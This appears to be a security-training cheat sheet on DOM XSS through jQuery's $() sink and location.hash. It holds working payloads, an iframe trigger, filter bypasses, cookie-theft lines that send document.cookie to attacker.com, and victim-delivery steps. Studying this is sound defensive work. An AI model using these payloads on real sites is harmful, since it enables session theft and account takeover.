# DOM XSS — jQuery $() Selector Sink via location.hash

## What it is
The page passes attacker-controlled input into jQuery's `$()` function. In older jQuery versions, if the string starts with `<`, jQuery treats it as HTML to create — not a CSS selector to find. Combined with a `hashchange` event listener, the hash value becomes a live HTML injection point.

**Key trait:** The source is `location.hash` — purely client-side, never sent to the server. Standard server-side WAFs are blind to it.

---

## Where to look

- Pages that auto-scroll to a section based on the URL hash
- Single-page apps that use the hash for navigation/routing
- Any JS code reading `location.hash` and passing it to jQuery
- Old jQuery versions (pre-3.x) — the HTML-in-selector behavior was patched

**How to spot it in source:**
```javascript
$(window).on('hashchange', function() {
    var target = $(location.hash);          // vulnerable
    var target = $(decodeURIComponent(location.hash.slice(1)));  // also vulnerable
});
```

---

## Why $() creates HTML from your input

jQuery's `$()` has two modes:
- `$('h2.title')` → finds existing elements matching the CSS selector
- `$('<img src=x>')` → **creates a new HTML element**

If your input starts with `<`, jQuery builds it as HTML and adds it to the DOM — executing any event handlers attached to it.

---

## Payload

```html
<img src=x onerror=alert(1)>
```

Put this in the hash:
```
https://target.com/#<img src=x onerror=alert(1)>
```

---

## The hashchange problem

`hashchange` fires when the hash **changes** — not on initial page load. If the victim navigates directly to the URL with the payload in the hash, the event never fires.

**Fix: use an iframe with onload**

```html
<iframe src="https://target.com/" onload="this.src += '#<img src=x onerror=print()>'">
```

How it works:
1. iframe loads the target page (no hash yet)
2. `onload` fires — appends the payload to the src
3. Hash changes → `hashchange` event fires on the page inside the iframe
4. jQuery reads the new hash → creates the `<img>` element → `onerror` fires

---

## Real-world payloads

```html
<!-- Cookie theft -->
<iframe src="https://target.com/" onload="this.src += '#<img src=x onerror=fetch(`https://attacker.com/?c=`+document.cookie)>'">

<!-- Cookie theft via image request -->
<iframe src="https://target.com/" onload="this.src += '#<img src=x onerror=new Image().src=`https://attacker.com/?c=`+document.cookie>'">
```

Host this on an attacker-controlled page and deliver the URL to the victim.

---

## Delivery

1. Host the iframe payload on your server (attacker.com/exploit.html)
2. Send the victim a link to your page
3. When they load it, the iframe silently loads the target and fires the payload

No interaction required from the victim beyond loading your page.

---

## Key traits of location.hash

- Everything after `#` in the URL
- **Never sent to the server** — invisible to server logs, WAFs, and IDS
- Can be changed client-side without a page reload (triggers `hashchange`)
- Not URL-decoded automatically — use `decodeURIComponent()` if the app does

---

## Filter bypasses

| Filter | Bypass |
|--------|--------|
| Blocks `onerror` | `<svg onload=alert(1)>` |
| Encodes `<` in hash | Use iframe onload — browser doesn't encode src changes done via JS |
| Blocks `alert` | `print()`, `confirm(1)` |
| Newer jQuery (3.x+) | `$()` no longer creates HTML from hash — need a different sink |

---

## HTML tag reminder

```html
<iframe src="..." onload="...">
```
- `>` ends the opening tag definition
- `</iframe>` closes the element (optional for iframes)
- A `>` inside quoted attribute values does NOT close the tag
